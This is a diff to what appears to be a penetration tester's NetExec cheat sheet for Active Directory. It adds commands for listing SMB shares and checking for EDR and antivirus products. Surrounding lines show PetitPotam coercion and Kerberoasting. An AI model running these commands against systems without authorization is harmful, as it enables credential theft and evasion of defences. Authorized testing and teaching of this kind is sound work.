@@ -21,6 +21,10 @@ nxc ldap $DC -u $USER -p $PASSWORD
 ```
 nxc smb $DC -u $USER -p $PASSWORD
 ```
+### Enumerate SMB Shares
+```
+nxc smb scope_ips.txt -u $USER -p $PASSWORD --shares
+```
 ### Read MSSQL Data
 ```
 nxc mssql $DATABASE -u $USER -p $USERPASS
@@ -32,4 +36,8 @@ nxc smb $IP -M coerce_plus -o METHOD=PetitPotam
 # Kerberoasting
 ```
 nxc ldap $DCIP -u $USER -p $USERPASS --kerberoasting kerberos_out.txt
+```
+# Checking [[Endpoint Detection and Response|EDR]]
+```
+nxc smb $IP -u $USER -p $USERPASS -M enum_av
 ```
